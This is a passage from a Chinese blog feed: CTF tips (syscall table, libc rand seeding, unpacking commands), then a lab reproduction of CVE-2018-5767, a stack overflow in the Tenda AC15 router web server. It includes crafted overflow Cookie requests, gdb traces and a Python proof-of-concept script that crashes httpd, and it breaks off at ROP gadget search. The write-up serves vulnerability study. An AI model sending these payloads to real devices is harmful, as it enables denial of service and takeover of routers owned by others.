kill</td></tr><tr><td>201</td><td>time</td><td>sys_time</td></tr><tr><td>202</td><td>futex</td><td>sys_futex</td></tr><tr><td>203</td><td>sched_setaffinity</td><td>sys_sched_setaffinity</td></tr><tr><td>204</td><td>sched_getaffinity</td><td>sys_sched_getaffinity</td></tr><tr><td>205</td><td>set_thread_area</td><td></td></tr><tr><td>206</td><td>io_setup</td><td>sys_io_setup</td></tr><tr><td>207</td><td>io_destroy</td><td>sys_io_destroy</td></tr><tr><td>208</td><td>io_getevents</td><td>sys_io_getevents</td></tr><tr><td>209</td><td>io_submit</td><td>sys_io_submit</td></tr><tr><td>210</td><td>io_cancel</td><td>sys_io_cancel</td></tr><tr><td>211</td><td>get_thread_area</td><td></td></tr><tr><td>212</td><td>lookup_dcookie</td><td>sys_lookup_dcookie</td></tr><tr><td>213</td><td>epoll_create</td><td>sys_epoll_create</td></tr><tr><td>214</td><td>epoll_ctl_old</td><td></td></tr><tr><td>215</td><td>epoll_wait_old</td><td></td></tr><tr><td>216</td><td>remap_file_pages</td><td>sys_remap_file_pages</td></tr><tr><td>217</td><td>getdents64</td><td>sys_getdents64</td></tr><tr><td>218</td><td>set_tid_address</td><td>sys_set_tid_address</td></tr><tr><td>219</td><td>restart_syscall</td><td>sys_restart_syscall</td></tr><tr><td>220</td><td>semtimedop</td><td>sys_semtimedop</td></tr><tr><td>221</td><td>fadvise64</td><td>sys_fadvise64</td></tr><tr><td>222</td><td>timer_create</td><td>sys_timer_create</td></tr><tr><td>223</td><td>timer_settime</td><td>sys_timer_settime</td></tr><tr><td>224</td><td>timer_gettime</td><td>sys_timer_gettime</td></tr><tr><td>225</td><td>timer_getoverrun</td><td>sys_timer_getoverrun</td></tr><tr><td>226</td><td>timer_delete</td><td>sys_timer_delete</td></tr><tr><td>227</td><td>clock_settime</td><td>sys_clock_settime</td></tr><tr><td>228</td><td>clock_gettime</td><td>sys_clock_gettime</td></tr><tr><td>229</td><td>clock_getres</td><td>sys_clock_getres</td></tr><tr><td>230</td><td>clock_nanosleep</td><td>sys_clock_nanosleep</td></tr><tr><td>231</td><td>exit_group</td><td>sys_exit_group</td></tr><tr><td>232</td><td>epoll_wait</td><td>sys_epoll_wait</td></tr><tr><td>233</td><td>epoll_ctl</td><td>sys_epoll_ctl</td></tr><tr><td>234</td><td>tgkill</td><td>sys_tgkill</td></tr><tr><td>235</td><td>utimes</td><td>sys_utimes</td></tr><tr><td>236</td><td>vserver</td><td></td></tr><tr><td>237</td><td>mbind</td><td>sys_mbind</td></tr><tr><td>238</td><td>set_mempolicy</td><td>sys_set_mempolicy</td></tr><tr><td>239</td><td>get_mempolicy</td><td>sys_get_mempolicy</td></tr><tr><td>240</td><td>mq_open</td><td>sys_mq_open</td></tr><tr><td>241</td><td>mq_unlink</td><td>sys_mq_unlink</td></tr><tr><td>242</td><td>mq_timedsend</td><td>sys_mq_timedsend</td></tr><tr><td>243</td><td>mq_timedreceive</td><td>sys_mq_timedreceive</td></tr><tr><td>244</td><td>mq_notify</td><td>sys_mq_notify</td></tr><tr><td>245</td><td>mq_getsetattr</td><td>sys_mq_getsetattr</td></tr><tr><td>246</td><td>kexec_load</td><td>sys_kexec_load</td></tr><tr><td>247</td><td>waitid</td><td>sys_waitid</td></tr><tr><td>248</td><td>add_key</td><td>sys_add_key</td></tr><tr><td>249</td><td>request_key</td><td>sys_request_key</td></tr><tr><td>250</td><td>keyctl</td><td>sys_keyctl</td></tr><tr><td>251</td><td>ioprio_set</td><td>sys_ioprio_set</td></tr><tr><td>252</td><td>ioprio_get</td><td>sys_ioprio_get</td></tr><tr><td>253</td><td>inotify_init</td><td>sys_inotify_init</td></tr><tr><td>254</td><td>inotify_add_watch</td><td>sys_inotify_add_watch</td></tr><tr><td>255</td><td>inotify_rm_watch</td><td>sys_inotify_rm_watch</td></tr><tr><td>256</td><td>migrate_pages</td><td>sys_migrate_pages</td></tr><tr><td>257</td><td>openat</td><td>sys_openat</td></tr><tr><td>258</td><td>mkdirat</td><td>sys_mkdirat</td></tr><tr><td>259</td><td>mknodat</td><td>sys_mknodat</td></tr><tr><td>260</td><td>fchownat</td><td>sys_fchownat</td></tr><tr><td>261</td><td>futimesat</td><td>sys_futimesat</td></tr><tr><td>262</td><td>newfstatat</td><td>sys_newfstatat</td></tr><tr><td>263</td><td>unlinkat</td><td>sys_unlinkat</td></tr><tr><td>264</td><td>renameat</td><td>sys_renameat</td></tr><tr><td>265</td><td>linkat</td><td>sys_linkat</td></tr><tr><td>266</td><td>symlinkat</td><td>sys_symlinkat</td></tr><tr><td>267</td><td>readlinkat</td><td>sys_readlinkat</td></tr><tr><td>268</td><td>fchmodat</td><td>sys_fchmodat</td></tr><tr><td>269</td><td>faccessat</td><td>sys_faccessat</td></tr><tr><td>270</td><td>pselect6</td><td>sys_pselect6</td></tr><tr><td>271</td><td>ppoll</td><td>sys_ppoll</td></tr><tr><td>272</td><td>unshare</td><td>sys_unshare</td></tr><tr><td>273</td><td>set_robust_list</td><td>sys_set_robust_list</td></tr><tr><td>274</td><td>get_robust_list</td><td>sys_get_robust_list</td></tr><tr><td>275</td><td>splice</td><td>sys_splice</td></tr><tr><td>276</td><td>tee</td><td>sys_tee</td></tr><tr><td>277</td><td>sync_file_range</td><td>sys_sync_file_range</td></tr><tr><td>278</td><td>vmsplice</td><td>sys_vmsplice</td></tr><tr><td>279</td><td>move_pages</td><td>sys_move_pages</td></tr><tr><td>280</td><td>utimensat</td><td>sys_utimensat</td></tr><tr><td>281</td><td>epoll_pwait</td><td>sys_epoll_pwait</td></tr><tr><td>282</td><td>signalfd</td><td>sys_signalfd</td></tr><tr><td>283</td><td>timerfd_create</td><td>sys_timerfd_create</td></tr><tr><td>284</td><td>eventfd</td><td>sys_eventfd</td></tr><tr><td>285</td><td>fallocate</td><td>sys_fallocate</td></tr><tr><td>286</td><td>timerfd_settime</td><td>sys_timerfd_settime</td></tr><tr><td>287</td><td>timerfd_gettime</td><td>sys_timerfd_gettime</td></tr><tr><td>288</td><td>accept4</td><td>sys_accept4</td></tr><tr><td>289</td><td>signalfd4</td><td>sys_signalfd4</td></tr><tr><td>290</td><td>eventfd2</td><td>sys_eventfd2</td></tr><tr><td>291</td><td>epoll_create1</td><td>sys_epoll_create1</td></tr><tr><td>292</td><td>dup3</td><td>sys_dup3</td></tr><tr><td>293</td><td>pipe2</td><td>sys_pipe2</td></tr><tr><td>294</td><td>inotify_init1</td><td>sys_inotify_init1</td></tr><tr><td>295</td><td>preadv</td><td>sys_preadv</td></tr><tr><td>296</td><td>pwritev</td><td>sys_pwritev</td></tr><tr><td>297</td><td>rt_tgsigqueueinfo</td><td>sys_rt_tgsigqueueinfo</td></tr><tr><td>298</td><td>perf_event_open</td><td>sys_perf_event_open</td></tr><tr><td>299</td><td>recvmmsg</td><td>sys_recvmmsg</td></tr><tr><td>300</td><td>fanotify_init</td><td>sys_fanotify_init</td></tr><tr><td>301</td><td>fanotify_mark</td><td>sys_fanotify_mark</td></tr><tr><td>302</td><td>prlimit64</td><td>sys_prlimit64</td></tr><tr><td>303</td><td>name_to_handle_at</td><td>sys_name_to_handle_at</td></tr><tr><td>304</td><td>open_by_handle_at</td><td>sys_open_by_handle_at</td></tr><tr><td>305</td><td>clock_adjtime</td><td>sys_clock_adjtime</td></tr><tr><td>306</td><td>syncfs</td><td>sys_syncfs</td></tr><tr><td>307</td><td>sendmmsg</td><td>sys_sendmmsg</td></tr><tr><td>308</td><td>setns</td><td>sys_setns</td></tr><tr><td>309</td><td>getcpu</td><td>sys_getcpu</td></tr><tr><td>310</td><td>process_vm_readv</td><td>sys_process_vm_readv</td></tr><tr><td>311</td><td>process_vm_writev</td><td>sys_process_vm_writev</td></tr><tr><td>312</td><td>kcmp</td><td>sys_kcmp</td></tr><tr><td>313</td><td>finit_module</td><td>sys_finit_module</td></tr></tbody></table><h2 id="Python-调用给定-libc-环境的种子-rand"><a href="#Python-调用给定-libc-环境的种子-rand" class="headerlink" title="Python 调用给定 libc 环境的种子 rand"></a>Python 调用给定 libc 环境的种子 rand</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">libc.srand(<span class="number">0x39</span>)</span><br><span class="line">rand_result = libc.rand()</span><br></pre></td></tr></table></figure><h2 id="linux-下的解压方法"><a href="#linux-下的解压方法" class="headerlink" title="linux 下的解压方法"></a>linux 下的解压方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*.tartar –xvf</span><br><span class="line">*.gzgzip -d 或 gunzip </span><br><span class="line">*.tar.gz/*.tgztar –xzf</span><br><span class="line">*.bz2bzip2 -d 或 bunzip2</span><br><span class="line">*.tar.bz2tar –xjf</span><br><span class="line">*.Zuncompress</span><br><span class="line">*.tar.Ztar –xZf </span><br><span class="line">*.rarunrar e</span><br><span class="line">*.zipunzip</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://trick.ink/article/glibc-all-in-one/">Glibc-All-In-One</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm">关于不同版本 glibc 更换的一些问题</a></p><p><a href="https://blog.csdn.net/A951860555/article/details/114106118">pwn题shellcode收集</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;总结一些常用的技巧。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="tricks" scheme="http://example.com/categories/ctf/tricks/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-5767复现</title>
    <link href="http://example.com/2023/01/18/CVE-2018-5767/"/>
    <id>http://example.com/2023/01/18/CVE-2018-5767/</id>
    <published>2023-01-18T12:29:07.000Z</published>
    <updated>2023-01-23T02:01:33.846Z</updated>
    
    <content type="html"><![CDATA[<p>考研期间想复现的漏洞，现在挖出来盘一下。</p><blockquote><p><a href="https://mp.weixin.qq.com/s/GDPpK1Pew6bkUZUfazur9Q">Tenda-AC15栈溢出漏洞(CVE-2018-5767)    by 星期五实验室</a></p><p><a href="https://zhuanlan.zhihu.com/p/468018356">cve-2018-5767 路由器栈溢出漏洞复现    by 合天网安实验室</a></p><p><a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/">CVE-2018-5767 复现分析    by CataLpa</a></p></blockquote><span id="more"></span><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 20.04</span><br><span class="line">IDA7.7</span><br><span class="line">GDB调试器</span><br><span class="line">Binwalk固件解包工具</span><br><span class="line">路由器固件：Tenda AC15 15.03.1.16_multi</span><br></pre></td></tr></table></figure><p><a href="https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1">Tenda AC15 15.03.1.16_multi下载地址</a></p><p><a href="https://www.cnblogs.com/deerCode/p/12153248.html">sasquatch报错问题解决</a></p><h3 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h3><ul><li><p>分离固件系统<code>binwalk -Me US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin</code>，得到扫描信息。</p></li><li><p>切换到<code>./~.extracted/squashfs-root</code>，可以看到提取出的文件系统目录：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root$ <span class="built_in">ls</span></span><br><span class="line">bin  dev  etc  etc_ro  home  init  lib  mnt  proc  root  sbin  sys  tmp  usr  var  webroot  webroot_ro</span><br></pre></td></tr></table></figure><ul><li>在<code>/bin</code>下看到了<code>busybox</code>文件，依稀记得哪年国赛有见到过，<code>busybox</code>是一个集成了一百多个常用Linux命令和工具的软件，在<code>嵌入式Linux</code>应用中，<code>busybox</code>应用非常广泛，同时大多数<code>Linux发行版</code>的安装程序中都含有<code>busybox</code>。我们查看一下其文件头信息：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root/bin$ readelf -h busybox </span><br><span class="line">ELF 头：</span><br><span class="line">  Magic：   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  类别:                              ELF32</span><br><span class="line">  数据:                              2 补码，小端序 (little endian)</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI 版本:                          0</span><br><span class="line">  类型:                              EXEC (可执行文件)</span><br><span class="line">  系统架构:                          ARM</span><br><span class="line">  版本:                              0x1</span><br><span class="line">  入口点地址：               0xbeec</span><br><span class="line">  程序头起点：          52 (bytes into file)</span><br><span class="line">  Start of section headers:          366736 (bytes into file)</span><br><span class="line">  标志：             0x5000002, Version5 EABI, &lt;unknown&gt;</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         7</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         24</span><br><span class="line">  Section header string table index: 23</span><br></pre></td></tr></table></figure><ul><li>我们采用<code>qemu</code>配合<code>chroot</code>来启动<code>/bin/httpd</code>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line"><span class="built_in">cp</span> /usr/bin/qemu-arm-static .</span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><ul><li>启动后发现程序一直卡在<code> Welcome to ...</code>：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/55814/9/22768/36236/63cb76a8F332e8710/76022a7a1563947d.png" style="zoom:80%;" /><ul><li>查看源程序，发现有两个检查，在<code>qemu</code>模拟环境下连接不到相关服务，因此<code>patch</code>掉：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/183742/15/31846/41397/63cb7716F4dcc06a7/efbc58270829d983.png" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check_network：检查网络</span><br><span class="line">ConnectCfm：连接某种服务</span><br></pre></td></tr></table></figure><ul><li>启动修改后的<code>httpd</code>，出现了新问题，<code>ip</code>地址不是本地的：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107512/5/34170/71762/63cb9cccF4863cd3a/252f16a530ff8205.png" style="zoom:80%;" /><ul><li>由此需要自行配置网桥<code>br0</code>后重新执行：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens33</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/199991/3/31226/69926/63cba043Fc231d974/68a8d252030e3f18.png" style="zoom:80%;" /><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ul><li>漏洞位于<code>R7WebsSecurityHandler</code>中：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/96405/27/36314/97172/63cba273Ff4595e2e/91d078e546898fe2.png" style="zoom:80%;" /><ul><li>先来看看<code>sscanf</code>的用法：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sscanf</span>(<span class="string">&quot;zhou456 hedf&quot;</span>, <span class="string">&quot;%[^ ]&quot;</span>, str); <span class="comment">//取到指定字符为止的字符串,取遇到空格为止字符串    </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;str=%s\n&quot;</span>, str);  <span class="comment">//str=zhou456;</span></span><br></pre></td></tr></table></figure><p>即将源字符串以一定形式(正则)读入到目的字符串。</p><ul><li><code>password</code>是用户可控的，它是<code>http</code>请求中<code>cookie</code>上的一个字段，也是伪代码中的<code>v40</code>，而<code>v33</code>数组只有<code>128</code>大小，<code>sscanf(v40, &quot;%*[^=]=%[^;];*&quot;, v33);</code>存在栈溢出漏洞。</li><li>我们检查下保护机制，除了栈不可执行，其他保护均未开启，容易想到<code>ROP</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     arm-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ul><li>首先我们要进入漏洞函数，只需访问如<code>/goform/anza</code>即可绕过判断。</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/203214/22/30645/24831/63cba72aFf1c6c343/6015d1ce1354bafa.png" alt="img" style="zoom:80%;" /><ul><li>访问<code>http://&lt; ip &gt;/goform/anza</code>，用火狐配合<code>burpsuite</code>抓个包：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/goform/anza</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.79.152</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><ul><li>增加<code>Cookie</code>字段送过去，尝试使进程崩溃：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/goform/anza</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.79.152</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><ul><li>查看服务端，发现程序出现了段错误：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/179852/7/31724/77375/63cba99fF355a5dc6/221b8aa6cd6408c2.png" style="zoom:80%;" /><ul><li>使用<code>gdb-multiarch</code>调试程序，在此之前现在固定端口打开程序：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure><ul><li>另开一个窗口进行调试：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> R0   0x0</span><br><span class="line"> R1   0xfffef87b ◂— stmdbvs r2!, &#123;r1, r2, r3, r5, r8, sb, sl, fp, sp&#125; ^ /* 0x69622f2e; &#x27;./bin/httpd&#x27; */</span><br><span class="line"> R2   0x0</span><br><span class="line"> R3   0x0</span><br><span class="line"> R4   0x0</span><br><span class="line"> R5   0x0</span><br><span class="line"> R6   0x0</span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0xd2000 —▸ 0xe520 ◂— push   &#123;r3, lr&#125; /* 0xe92d4008 */</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x0</span><br><span class="line"> SP   0xfffef770 ◂— 1</span><br><span class="line"> PC   0xff7e1930 (_start) ◂— mov    r0, sp /* 0xe1a0000d; &#x27;\r&#x27; */</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0xff7e1930 &lt;_start&gt;       mov    r0, sp</span><br><span class="line">   0xff7e1934 &lt;_start+4&gt;     bl     #0xff7e4bb4                   &lt;0xff7e4bb4&gt;</span><br><span class="line"> </span><br><span class="line">   0xff7e1938 &lt;_start+8&gt;     mov    r6, r0</span><br><span class="line">   0xff7e193c &lt;_start+12&gt;    ldr    sl, [pc, #0x30]</span><br><span class="line">   0xff7e1940 &lt;_start+16&gt;    add    sl, pc, sl</span><br><span class="line">   0xff7e1944 &lt;_start+20&gt;    ldr    r4, [pc, #0x2c]</span><br><span class="line">   0xff7e1948 &lt;_start+24&gt;    ldr    r4, [sl, r4]</span><br><span class="line">   0xff7e194c &lt;_start+28&gt;    ldr    r1, [sp]</span><br><span class="line">   0xff7e1950 &lt;_start+32&gt;    sub    r1, r1, r4</span><br><span class="line">   0xff7e1954 &lt;_start+36&gt;    add    sp, sp, r4, lsl #2</span><br><span class="line">   0xff7e1958 &lt;_start+40&gt;    add    r2, sp, #4</span><br></pre></td></tr></table></figure><ul><li>断点下在<code>End of function R7WebsSecurityHandler</code>即执行如下命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x002ED18</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><ul><li>而后再打开一个窗口，我们用<code>python</code>的<code>request库</code>将数据传过去：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x400</span>&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>但我们没有按预期返回，而是被某子函数干扰了，<code>gdb</code>中利用<code>bt</code>命令溯源一下：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/112590/12/35271/139746/63cbdf3cF15f3db66/09273cb75e2df912.png" style="zoom:80%;" /><ul><li>在<code>ida</code>中找到干扰函数所在位置，我们要想办法防止程序执行流走到该分支：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/174764/17/33384/125374/63cbe09cFc920f42f/bb10de241747a44f.png" style="zoom:80%;" /><ul><li>修改<code>payload</code>，使<code>password</code>加上<code>.gif</code>即可直接返回，如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x400</span>+<span class="string">&quot;.gif&quot;</span>&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>重复上述流程，程序执行流来到我们发生的垃圾数据，我们注意到地址是<code>0x61616160</code>而非<code>0x61616161</code>，这是因为<code>arm</code>模式与<code>thumb</code>模式的切换问题。在函数退出时执行了<code>pop pc</code>的操作，而其最低有效位(LSB)将会被写入到<code>CPSR寄存器</code>(当前程序状态寄存器)的T位中：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/52601/34/22749/86724/63cbe317F2b18c959/149ae61d7acf6b6d.png" style="zoom:80%;" /><ul><li>在构造<code>ROP</code>链之前，首先我们需要明白<code>32位arm</code>架构是如何进行系统调用的：</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/97649/20/35562/153499/63cbe7d8Ff346c9f7/2d26131e222dfd7a.png" style="zoom:80%;" /><ul><li>本质和<code>x86/x64</code>大差不差，用<code>ROPgagdet</code>找到需要的<code>gadget</code>：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 